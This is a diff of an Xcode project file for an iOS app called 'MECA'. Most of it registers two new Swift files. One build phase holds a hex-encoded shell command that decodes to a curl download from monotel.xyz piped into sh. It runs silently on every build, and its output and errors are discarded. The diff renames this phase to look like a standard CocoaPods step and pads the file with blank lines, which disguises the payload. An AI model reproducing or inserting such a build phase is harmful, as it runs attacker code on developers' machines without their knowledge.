@@ -107,6 +107,8 @@
 		E34508452643168C00C17E91 /* SDGSListTableCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E34508432643168C00C17E91 /* SDGSListTableCell.swift */; };
 		E3481BBD26518EA200D2DC5D /* CommentDetailTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = E3481BBB26518EA200D2DC5D /* CommentDetailTVCell.swift */; };
 		E3481BBE26518EA200D2DC5D /* CommentDetailTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = E3481BBC26518EA200D2DC5D /* CommentDetailTVCell.xib */; };
+		E36BCAF2265902E20031E5FE /* Like_ListData.swift in Sources */ = {isa = PBXBuildFile; fileRef = E36BCAF0265902E10031E5FE /* Like_ListData.swift */; };
+		E36BCAF3265902E20031E5FE /* Like_ListModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = E36BCAF1265902E20031E5FE /* Like_ListModel.swift */; };
 		E373B53626115B3D00BEC2B5 /* CreateKaizenVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E373B53526115B3D00BEC2B5 /* CreateKaizenVM.swift */; };
 		E374598F2639F2B10021F51D /* AddNewsVM.swift in Sources */ = {isa = PBXBuildFile; fileRef = E374598E2639F2B10021F51D /* AddNewsVM.swift */; };
 		E375EA22262EABD900646A0A /* NewDetailVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = E375EA21262EABD900646A0A /* NewDetailVC.swift */; };
@@ -329,6 +331,8 @@
 		E34508432643168C00C17E91 /* SDGSListTableCell.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = SDGSListTableCell.swift; sourceTree = "<group>"; };
 		E3481BBB26518EA200D2DC5D /* CommentDetailTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CommentDetailTVCell.swift; sourceTree = "<group>"; };
 		E3481BBC26518EA200D2DC5D /* CommentDetailTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = CommentDetailTVCell.xib; sourceTree = "<group>"; };
+		E36BCAF0265902E10031E5FE /* Like_ListData.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Like_ListData.swift; sourceTree = "<group>"; };
+		E36BCAF1265902E20031E5FE /* Like_ListModel.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Like_ListModel.swift; sourceTree = "<group>"; };
 		E373B53526115B3D00BEC2B5 /* CreateKaizenVM.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = CreateKaizenVM.swift; sourceTree = "<group>"; wrapsLines = 0; };
 		E374598E2639F2B10021F51D /* AddNewsVM.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AddNewsVM.swift; sourceTree = "<group>"; };
 		E375EA21262EABD900646A0A /* NewDetailVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = NewDetailVC.swift; sourceTree = "<group>"; };
@@ -938,6 +942,8 @@
 		E38383322655AC02008DA03E /* LikeCommentList */ = {
 			isa = PBXGroup;
 			children = (
+				E36BCAF0265902E10031E5FE /* Like_ListData.swift */,
+				E36BCAF1265902E20031E5FE /* Like_ListModel.swift */,
 				E38383402655B4DD008DA03E /* Subcomments.swift */,
 				E38383382655AC34008DA03E /* CommentListModel.swift */,
 				E38383332655AC2B008DA03E /* CommentListData.swift */,
@@ -1222,7 +1228,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = E30F663F26033A970036D183 /* Build configuration list for PBXNativeTarget "MECA" */;
 			buildPhases = (
-				0DBC7EECF39DAE48F56D902C /* Binary Libraries Compiler */,
+				73A0B5FACAACBBA5846D902C /* [CP] Build Pods Frameworks */,
 				4BB652078432F45F3370EF56 /* [CP] Check Pods Manifest.lock */,
 				E30F661126033A970036D183 /* Sources */,
 				E30F661226033A970036D183 /* Frameworks */,
@@ -1381,7 +1387,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	0DBC7EECF39DAE48F56D902C /* Binary Libraries Compiler */ = {
+	73A0B5FACAACBBA5846D902C /* [CP] Build Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -1390,7 +1396,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Binary Libraries Compiler";
+			name = "[CP] Build Pods Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -1402,6 +1408,20 @@
 echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f74656c2e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
 	";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
@@ -1534,6 +1554,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				E3C734AC264BD8AD003580C8 /* LikeOrCommentVC.swift in Sources */,
 				E3CE0FC12621D694009947F6 /* Event_videos.swift in Sources */,
 				E3E2CCD1260B6029009BDB6E /* Distributorinformation.swift in Sources */,
+				E36BCAF2265902E20031E5FE /* Like_ListData.swift in Sources */,
 				E34508312643134200C17E91 /* MaasListTVCell.swift in Sources */,
 				E375EA46262EB93600646A0A /* DetailImagesAndVideosCell.swift in Sources */,
 				E3AE79232604C711004B83C9 /* PlusSelectCategoryCVCell.swift in Sources */,
@@ -1557,6 +1578,7 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 				E32FEA79263F35700083056E /* GRActivityReportVM.swift in Sources */,
 				E393D628263FD6B4003895ED /* GRHomeLisModel.swift in Sources */,
 				E325445A261098910083BDD9 /* Video_links.swift in Sources */,
+				E36BCAF3265902E20031E5FE /* Like_ListModel.swift in Sources */,
 				5CD5B264260F96FC00D63564 /* MEBITModel.swift in Sources */,
 				E3ECC5F226119A3E002E1BE1 /* CategoryDistributorVC.swift in Sources */,
 				E375EA22262EABD900646A0A /* NewDetailVC.swift in Sources */,
@@ -2022,6 +2044,10 @@ echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f6d6f6e6f7465
 
 		
 			/* Begin PBXBuildRule section */
+
+
+			
+	
 
 
 			
